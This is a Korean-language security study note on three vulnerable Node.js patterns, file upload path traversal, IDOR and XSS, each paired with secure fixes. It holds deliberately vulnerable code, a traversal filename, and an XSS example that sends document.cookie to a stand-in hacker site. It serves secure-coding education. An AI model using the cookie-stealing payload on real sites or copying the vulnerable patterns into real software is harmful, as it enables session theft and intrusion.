# Day 5 - Node.js 취약 코드 패턴 (패턴 4-6)

## 패턴 4: 파일 업로드

### 확인해야 할 5가지
```
1. 파일 확장자  → .php 등 실행 가능한 파일 차단
2. Content-Type → 허용된 타입인지 확인 (화이트리스트)
3. 저장 위치    → 웹 루트 밖에 저장 (PHP 실행 불가 위치)
4. 파일명       → 원본 파일명 버리고 새로 생성
5. 파일 크기    → 제한 없으면 서버 용량 공격 가능
```

### 취약 코드
```javascript
const upload = multer({ dest: 'public/uploads/' });

router.post('/upload', upload.single('file'), (req, res) => {
  // 위험: 원본 파일명 그대로 사용
  res.json({
    url: `/uploads/${req.file.originalname}`
  });
});
```

### 원본 파일명이 위험한 이유 — 경로 순회(Path Traversal)
```
파일명: ../../../app.js
→ public/uploads/../../../app.js
→ 서버 소스코드를 덮어쓰기 가능
```

ZAP 스캔에서 High로 나왔던 **경로 추적** 취약점이 바로 이것.

### 안전 코드
```javascript
const storage = multer.diskStorage({
  // 1. 웹 루트 밖에 저장
  destination: path.join(__dirname, '..', 'private_uploads'),
  filename: (req, file, cb) => {
    // 2. 파일명 완전히 새로 생성 (원본 파일명 버림)
    const safeName = `${Date.now()}-${crypto.randomBytes(16).toString('hex')}.jpg`;
    cb(null, safeName);
  }
});

const upload = multer({
  storage,
  // 3. 파일 크기 제한 (5MB)
  limits: { fileSize: 5 * 1024 * 1024 },
  // 4. 허용 타입 화이트리스트
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/gif'];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('허용되지 않는 파일 형식'));
    }
  }
});
```

### Day 2 랩과의 연결
Day 2 랩에서 서버가 아무것도 검증하지 않아서:
- `.php` 확장자 그대로 업로드 가능
- PHP 파일이 서버에서 실행됨
- `/home/carlos/secret` 파일 내용 읽기 성공

---

## 패턴 5: 접근 제어 (IDOR)

### IDOR란?
**Insecure Direct Object Reference** — 다른 사람의 리소스에 접근할 수 있는 취약점.

### 예시
내 게시글 삭제 URL:
```
DELETE /post/123
```
공격자가 숫자만 바꾸면:
```
DELETE /post/124  → 다른 사람 게시글 삭제 가능
```
서버가 소유권 확인을 안 하면 누구든 삭제 가능.

### 취약 코드
```javascript
// 로그인은 확인하지만 소유권은 확인 안 함
router.delete('/post/:id', authMiddleware, async (req, res) => {
  await Post.destroy({ where: { id: req.params.id } });
  res.json({ success: true });
});

// 관리자 페이지에 로그인 확인만 — 일반 유저도 접근 가능
router.get('/admin/users', authMiddleware, async (req, res) => {
  const users = await User.findAll();
  res.json(users);
});
```

### 안전 코드
```javascript
// 소유권 확인
router.delete('/post/:id', authMiddleware, async (req, res) => {
  const post = await Post.findByPk(req.params.id);

  if (!post) {
    return res.status(404).json({ error: '게시글이 없습니다.' });
  }

  // 내 글인지 확인
  if (post.userId !== req.user.id) {
    return res.status(403).json({ error: '권한이 없습니다.' });
  }

  await post.destroy();
  res.json({ success: true });
});

// 관리자 페이지 — role 추가 확인
router.get('/admin/users', authMiddleware, requireRole('admin'), async (req, res) => {
  const users = await User.findAll();
  res.json(users);
});

// 역할 확인 미들웨어
function requireRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}
```

### 정리
```
authMiddleware → 로그인 여부만 확인
requireRole    → 역할(admin 등) 확인
소유권 확인    → 내 리소스인지 확인

세 가지 모두 필요한 상황에서는 모두 사용해야 함
```

---

## 패턴 6: XSS (Cross-Site Scripting)

### XSS란?
공격자가 웹페이지에 악성 JavaScript를 심는 공격.

### 공격 흐름
```
1. 공격자가 게시판에 악성 스크립트 입력:
   <script>document.location='https://해커사이트.com?c='+document.cookie</script>

2. 서버가 그대로 저장

3. 다른 사용자가 그 글을 열람

4. 스크립트 실행 → 피해자 쿠키(세션)가 해커에게 전송

5. 해커가 피해자 계정 탈취
```

### 취약 코드
```javascript
// EJS 템플릿 — HTML 그대로 출력
<h1><%- post.title %></h1>   // <%- 는 이스케이프 안 함 → 위험

// 클라이언트 JS — innerHTML 사용
document.getElementById('content').innerHTML = post.content;  // 위험
```

### 안전 코드
```javascript
// EJS 템플릿 — HTML 자동 이스케이프
<h1><%= post.title %></h1>   // <%= 는 자동 이스케이프 → 안전

// 클라이언트 JS — textContent 사용
document.getElementById('content').textContent = post.content;  // 안전

// HTML 렌더링이 꼭 필요하면 DOMPurify로 정화
element.innerHTML = DOMPurify.sanitize(post.content);
```

### innerHTML vs textContent
```javascript
// innerHTML
element.innerHTML = "<script>alert('XSS')</script>"
→ 브라우저가 HTML로 파싱 → 스크립트 실행됨

// textContent
element.textContent = "<script>alert('XSS')</script>"
→ <, > 를 &lt; &gt; 로 변환
→ 브라우저가 문자열로만 처리 → 그냥 텍스트로 표시됨
```

### 이스케이프란?
```
입력:   <script>alert('XSS')</script>
출력:   &lt;script&gt;alert('XSS')&lt;/script&gt;
→ 브라우저가 코드로 실행하지 않고 문자열로 표시
```

---

## 패턴 4-6 핵심 요약

| 패턴 | 취약 | 안전 |
|------|------|------|
| 파일 업로드 | 검증 없이 저장, 원본 파일명 사용 | 화이트리스트, 파일명 재생성, 웹루트 밖 저장 |
| IDOR | 로그인만 확인 | 소유권 + 역할(role) 확인 |
| XSS | innerHTML, 이스케이프 없는 출력 | textContent, <%= 이스케이프 |
